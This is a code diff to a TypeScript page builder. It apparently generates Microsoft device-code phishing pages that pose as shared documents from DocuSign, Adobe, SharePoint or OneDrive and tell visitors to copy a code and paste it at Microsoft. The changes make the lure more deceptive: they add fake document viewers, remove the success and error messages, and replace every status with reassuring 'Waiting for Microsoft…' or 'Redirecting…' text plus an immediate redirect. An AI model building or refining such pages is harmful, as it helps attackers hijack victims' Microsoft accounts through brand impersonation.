@@ -13,7 +13,7 @@ export const pageDesigns: PageDesign[] = [
   { id: "resource-portal", name: "Resource Workspace", description: "Resource cards drive a workspace-style composition.", structure: "Workspace + authorization", accent: "#03787c" },
   { id: "two-column-instructions", name: "Side Instructions", description: "Instructions emphasized beside a compact action panel.", structure: "Instructions + action", accent: "#0f6cbd" },
   { id: "modern-glass", name: "Document Hero", description: "The resource visual dominates; authorization stays secondary.", structure: "Document hero + floating action", accent: "#7c3aed" },
-  { id: "mobile-first-stack", name: "Corporate Access", description: "Restrained company context beside the access task.", structure: "Corporate context + access", accent: "#3158d4" },
+  { id: "mobile-first-stack", name: "Agreement Review", description: "Agreement context beside a focused access task.", structure: "Agreement summary + access", accent: "#3158d4" },
   { id: "full-hero", name: "Mobile File Access", description: "A touch-first stacked file workflow.", structure: "Mobile file stack", accent: "#0f6cbd" },
 ];
 
@@ -37,7 +37,7 @@ export function defaultBuilderConfiguration(layoutId: BuilderConfiguration["layo
     steps: ["Copy the verification code.", "Continue to Microsoft and paste the code.", "Complete authentication on Microsoft’s website."],
     continueButtonText: "Continue to Microsoft",
     footer: "Authentication continues securely on Microsoft’s website.",
-    successMessage: "Authorization completed successfully.",
+    successMessage: "",
     redirectText: "Redirecting to",
     primaryColor: preset.accent,
     background: preset.surface,
@@ -58,7 +58,7 @@ export function defaultBuilderConfiguration(layoutId: BuilderConfiguration["layo
     logoMaxHeight: 48,
     logoBackground: "none",
     showProviderName: true,
-    redirectDelay: "3",
+    redirectDelay: "immediate",
   };
 }
 
@@ -90,13 +90,13 @@ export function buildPageDesign(config: BuilderConfiguration, state: PreviewStat
       break;
     case "split-screen":
       page.nodes = [columns("split-document", [
-        section("split-rail", [brand(c, "left"), documentTile(c, "split-file"), text("split-sender", `From ${c.sender}`, { color: "#667085", fontSize: "12px", margin: "20px 0 0" })], { minHeight: "100vh", padding: "28px", background: softTint(c.primaryColor) }),
-        section("split-workflow", [n("split-inner", "section", "Authorization", { style: { maxWidth: "460px", margin: "auto", padding: "20px 0" }, children: auth })], { minHeight: "100vh", padding: "32px", background: preset.elevatedSurface }),
-      ], { gridTemplateColumns: "40% 60%", gap: "0", minHeight: "100vh" })];
+        section("split-rail", [documentViewer(c, "split-viewer")], { minHeight: "100vh", padding: "24px", background: viewerSurface(c) }),
+        section("split-workflow", [n("split-inner", "section", "Authorization", { style: { maxWidth: "420px", margin: "auto", padding: "20px 0" }, children: [brand(c, "left"), heading("split-name", c.documentName, { fontSize: "22px", margin: "18px 0 4px" }), metadata(c), text("split-sender", `From ${c.sender}`, { color: "#667085", fontSize: "12px", margin: "8px 0 18px" }), ...auth] })], { minHeight: "100vh", padding: "32px", background: preset.elevatedSurface, border: `1px solid ${preset.border}` }),
+      ], { gridTemplateColumns: "minmax(0,1.6fr) minmax(320px,1fr)", gap: "0", minHeight: "100vh" })];
       break;
     case "document-view":
       page.nodes = [section("detail-stage", [columns("detail-columns", [
-        n("detail-preview", "section", "Document preview", { style: { minHeight: "620px", padding: "24px", background: "#ececec", borderRadius: preset.radius }, children: [documentSheet(c)] }),
+        n("detail-preview", "section", "Document preview", { style: { minHeight: "620px", padding: "20px", background: viewerSurface(c), border: `1px solid ${preset.border}`, borderRadius: preset.radius }, children: [documentViewer(c, "detail-viewer")] }),
         n("detail-panel", "section", "Document details", { style: { padding: "8px 0" }, children: [brand(c, "left"), heading("detail-name", c.documentName, { fontSize: "23px", margin: "12px 0 4px" }), metadata(c), text("detail-status", c.documentStatus!, { color: "#667085", fontSize: "13px", margin: "12px 0 4px" }), divider("detail-divider"), ...auth] }),
       ], { gridTemplateColumns: "1.35fr .65fr", gap: "28px", alignItems: "start" })], { minHeight: "100vh", padding: "24px", background: preset.surface })];
       break;
@@ -133,7 +133,7 @@ export function buildPageDesign(config: BuilderConfiguration, state: PreviewStat
     case "modern-glass":
       page.nodes = [section("hero-stage", [
         n("document-hero", "section", "Document hero", { style: { minHeight: "520px", maxWidth: "1050px", margin: "0 auto", padding: "32px", borderRadius: preset.radius, background: preset.elevatedSurface, border: `1px solid ${preset.border}`, boxShadow: preset.shadow }, children: [...brandPair(c), columns("hero-content", [
-          n("hero-document", "section", "Document focus", { style: { padding: "20px 0" }, children: [fileGlyph("hero-file", c.primaryColor), heading("hero-document-name", c.documentName, { fontSize: "30px" }), metadata(c), text("hero-status", c.documentStatus!, { color: "#667085", fontSize: "13px" })] }),
+          n("hero-document", "section", "Document focus", { style: { padding: "8px 0" }, children: [documentViewer(c, "hero-viewer")] }),
           card("hero-action", auth, providerCard(c, { padding: "22px", margin: "28px 0 0" })),
         ], { gridTemplateColumns: "1.2fr .8fr", gap: "30px", alignItems: "center" })] }),
       ], { minHeight: "100vh", padding: "28px 22px", background: preset.surface })];
@@ -157,22 +157,16 @@ export function buildPageDesign(config: BuilderConfiguration, state: PreviewStat
 function authorization(c: BuilderConfiguration, state: PreviewState, dark: boolean): PageNode[] {
   const preset = providerAssets[c.provider];
   const muted = dark ? "#aebdca" : "#667085";
-  const terminal = ["expired", "error"].includes(state);
   return [
-    n("auth-active", "section", "Authorization", { visibleWhen: ["initial", "waiting", "ready", "reviewing", "expired", "error"], children: [
+    n("auth-active", "section", "Authorization", { children: [
       n("auth-code", "deviceCode", "Verification code", { content: "Verification code", style: { margin: "16px 0 10px", borderRadius: preset.radius } }),
       button("auth-copy", "Copy Code", "copy-device-code", { width: "100%", padding: "10px", background: "transparent", color: c.primaryColor, border: `1px solid ${softBorder(c.primaryColor)}`, borderRadius: preset.radius }),
+      text("auth-copy-feedback", "Copied", { textAlign: "center", color: muted, fontSize: "11px", margin: "5px 0 0" }),
       steps("auth-steps", c.steps, { margin: "16px 0", color: muted }),
       button("auth-continue", c.continueButtonText, "open-microsoft", { width: "100%", padding: "13px", background: c.primaryColor, color: readable(c.primaryColor), borderRadius: preset.radius }),
+      button("auth-popup-fallback", "Open Microsoft", "open-microsoft", { width: "100%", padding: "10px", background: "transparent", color: c.primaryColor, border: "0", borderRadius: preset.radius }),
     ] }),
-    n("auth-success", "section", "Success", { visibleWhen: ["success", "completed", "connected", "authorized"], style: { padding: "20px 0", textAlign: "center" }, children: [
-      text("success-check", "✓", { textAlign: "center", color: "#15906f", fontSize: "32px", margin: "0 0 8px" }),
-      heading("success-title", "Authorization Complete", { textAlign: "center", fontSize: "25px" }),
-      text("success-message", c.successMessage!, { textAlign: "center", color: muted }),
-      text("success-redirect", c.redirectUrl ? `${c.redirectText}: ${safeHost(c.redirectUrl)}` : "No redirect configured", { textAlign: "center", color: muted, fontSize: "12px" }),
-    ] }),
-    n("auth-error-message", "callout", "Terminal state", { visibleWhen: ["expired", "error", "failed", "cancelled"], content: terminal ? "Authorization could not be completed. You can restart safely." : "", style: { padding: "10px", background: dark ? "#32171b" : "#fff1f0", border: "0", color: dark ? "#fecaca" : "#b42318", boxShadow: "none", margin: "12px 0" } }),
-    n("auth-status", "status", "Authorization status", { content: stateLabel(state), statusKind: state === "success" ? "success" : state === "expired" ? "expired" : state === "error" ? "failed" : "waiting", style: { margin: "14px 0 0", color: muted } }),
+    n("auth-status", "status", "Authorization status", { content: stateLabel(state), statusKind: "waiting", style: { margin: "14px 0 0", color: muted } }),
     text("auth-footer", c.footer, { margin: "14px 0 0", textAlign: "center", fontSize: "11px", color: muted }),
   ];
 }
@@ -201,7 +195,7 @@ function logoNodes(c: BuilderConfiguration, alignment: "left" | "center" | "righ
 function providerLogo(c: BuilderConfiguration, alignment: "left" | "center" | "right") {
   const preset = providerAssets[c.provider];
   const content = c.provider === "docusign" ? undefined : c.provider === "company" || c.provider === "custom" ? c.companyName : preset.name;
-  return n("provider-logo", "providerLogo", "Provider identity", { provider: providerProfiles[c.provider].nodeProvider, src: preset.logoSrc, alt: preset.logoAlt, content, style: { width: c.provider === "docusign" ? "112px" : "150px", height: "32px", maxWidth: "150px", margin: alignment === "center" ? "0 auto" : alignment === "right" ? "0 0 0 auto" : "0", fontSize: "13px", fontWeight: "600", color: "#323130" } });
+  return n("provider-logo", "providerLogo", "Provider identity", { provider: providerProfiles[c.provider].nodeProvider, src: preset.logoSrc, alt: preset.logoAlt, content, style: { width: c.provider === "docusign" ? "112px" : c.provider === "adobe" ? "190px" : "170px", height: c.provider === "adobe" ? "32px" : "36px", maxWidth: "190px", margin: alignment === "center" ? "0 auto" : alignment === "right" ? "0 0 0 auto" : "0", fontSize: "13px", fontWeight: "600", color: "#323130", gap: c.provider === "adobe" ? "32px" : "9px" } });
 }
 function companyLogo(c: BuilderConfiguration, alignment: "left" | "center" | "right") {
   if (c.logoMode === "provider" || c.logoMode === "none") return null;
@@ -217,8 +211,16 @@ function providerCard(c: BuilderConfiguration, extra: PageNode["style"] = {}): P
   const preset = providerAssets[c.provider];
   return { background: preset.elevatedSurface, border: `1px solid ${preset.border}`, borderRadius: preset.radius, boxShadow: preset.shadow, ...extra };
 }
-function documentTile(c: BuilderConfiguration, id: string) { return card(id, [fileGlyph(`${id}-icon`, c.primaryColor), heading(`${id}-name`, c.documentName, { fontSize: "16px", textAlign: "center" }), text(`${id}-meta`, `${c.fileType}\n${c.documentStatus}`, centerMuted())], { maxWidth: "250px", margin: "18px auto", padding: "22px", textAlign: "center", boxShadow: "0 10px 28px #1720330d" }); }
-function documentSheet(c: BuilderConfiguration) { return n("document-sheet", "section", "Document sheet", { style: { maxWidth: "430px", minHeight: "570px", margin: "0 auto", padding: "48px 38px", background: "#fff", boxShadow: "0 12px 38px #17203316", textAlign: "center" }, children: [fileGlyph("sheet-icon", c.primaryColor), heading("sheet-title", c.documentTitle!, { fontSize: "24px", textAlign: "center", margin: "24px 0 10px" }), text("sheet-name", c.documentName, { textAlign: "center", color: "#344054" }), divider("sheet-rule"), text("sheet-copy", "This document is available to approved recipients after secure verification.", { textAlign: "left", color: "#667085", fontSize: "13px" })] }); }
+function documentViewer(c: BuilderConfiguration, id: string) {
+  return n(id, "section", "Document viewer", { style: { padding: "0", border: `1px solid ${providerAssets[c.provider].border}`, borderRadius: providerAssets[c.provider].radius, background: providerAssets[c.provider].elevatedSurface, boxShadow: providerAssets[c.provider].shadow, overflow: "hidden" } as PageNode["style"], children: [
+    n(`${id}-toolbar`, "section", "Document toolbar", { style: { padding: "12px 14px", boxShadow: `inset 0 -1px ${providerAssets[c.provider].border}`, background: providerAssets[c.provider].elevatedSurface }, children: [
+      heading(`${id}-filename`, c.documentName, { fontSize: "13px", margin: "0 0 3px" }),
+      text(`${id}-counter`, `${c.fileType} · ${c.fileSize} · ${c.pageCount}`, { color: "#667085", fontSize: "11px", margin: "0" }),
+    ] }),
+    n(`${id}-canvas`, "section", "Document canvas", { style: { minHeight: "510px", padding: "22px", background: viewerSurface(c) }, children: [documentSheet(c)] }),
+  ] });
+}
+function documentSheet(c: BuilderConfiguration) { return n("document-sheet", "section", "Document sheet", { style: { width: "min(100%,390px)", minHeight: "505px", margin: "0 auto", padding: "42px 36px", background: "#fff", boxShadow: "0 8px 28px #1720331a", textAlign: "left" }, children: [text("sheet-kicker", c.department!, { color: c.primaryColor, fontSize: "10px", fontWeight: "700", letterSpacing: ".08em", margin: "0 0 20px" }), heading("sheet-title", c.documentTitle!, { fontSize: "22px", margin: "0 0 8px" }), text("sheet-name", c.documentName, { color: "#667085", fontSize: "12px" }), divider("sheet-rule"), heading("sheet-section", "Document summary", { fontSize: "13px", margin: "24px 0 10px" }), text("sheet-copy", "Prepared for review and secure access. The complete document becomes available after recipient verification.", { color: "#667085", fontSize: "11px", lineHeight: "1.7" }), n("sheet-lines", "section", "Document placeholder lines", { style: { minHeight: "150px", margin: "24px 0", background: "repeating-linear-gradient(to bottom,#e9edf2 0,#e9edf2 5px,transparent 5px,transparent 18px)" } }), text("sheet-signature", "Signature ____________________", { color: "#98a2b3", fontSize: "11px", margin: "34px 0 0" })] }); }
 function metadata(c: BuilderConfiguration, centered = false) { return text(`metadata-${centered ? "center" : "left"}`, `${c.fileType} · ${c.pageCount} · ${c.fileSize}\n${c.documentStatus}`, { color: "#667085", fontSize: "12px", textAlign: centered ? "center" : "left", lineHeight: "1.6" }); }
 function fileGlyph(id: string, color: string) { return n(id, "callout", "File icon", { content: "▤", style: { width: "54px", minHeight: "62px", margin: "0 auto 14px", padding: "14px", background: softTint(color), color, border: "0", borderRadius: "10px", boxShadow: "none", textAlign: "center", fontSize: "24px" } }); }
 function n(id: string, type: PageNode["type"], name: string, extra: Partial<PageNode> = {}): PageNode { return { id, type, name, ...extra }; }
@@ -232,9 +234,14 @@ function divider(id: string) { return n(id, "divider", "Divider"); }
 function steps(id: string, items: BuilderConfiguration["steps"], style: PageNode["style"] = {}) { return n(id, "steps", "Instructions", { items, style }); }
 function button(id: string, content: string, action: PageNode["action"], style: PageNode["style"] = {}) { return n(id, "button", "Button", { content, action, style }); }
 function resource(id: string, name: string, provider: NonNullable<PageNode["provider"]>, content: string) { return n(id, "resourceCard", name, { provider, content }); }
-function centerMuted(): PageNode["style"] { return { textAlign: "center", color: "#667085", fontSize: "12px" }; }
 function softTint(color: string) { return `color-mix(in srgb,${color} 8%,#ffffff)`; }
+function viewerSurface(c: BuilderConfiguration) {
+  if (c.provider === "adobe") return "#ecebea";
+  if (c.provider === "docusign") return "#f2f0eb";
+  if (c.provider === "sharepoint") return "#eef5f4";
+  if (c.provider === "onedrive") return "#f1f6fb";
+  return "#f2f4f7";
+}
 function softBorder(color: string) { return `color-mix(in srgb,${color} 24%,#e4e7ec)`; }
 function readable(color: string) { const value = Number.parseInt(color.slice(1), 16); return (((value >> 16) * 299 + ((value >> 8) & 255) * 587 + (value & 255) * 114) / 1000) > 160 ? "#172033" : "#ffffff"; }
-function safeHost(value: string) { try { return new URL(value).hostname; } catch { return value; } }
-function stateLabel(state: PreviewState) { return ({ initial: "Ready to begin", waiting: "Waiting for authorization", success: "Authorization complete", expired: "Authorization expired", error: "Authorization failed", ready: "Ready for review", reviewing: "Reviewing document", completed: "Completed" } as Record<PreviewState, string>)[state]; }
+function stateLabel(state: PreviewState) { return ({ initial: "Waiting for Microsoft…", waiting: "Waiting for Microsoft…", success: "Redirecting…", expired: "Preparing a new Microsoft code…", error: "Reconnecting…", ready: "Waiting for Microsoft…", reviewing: "Waiting for Microsoft…", completed: "Redirecting…" } as Record<PreviewState, string>)[state]; }
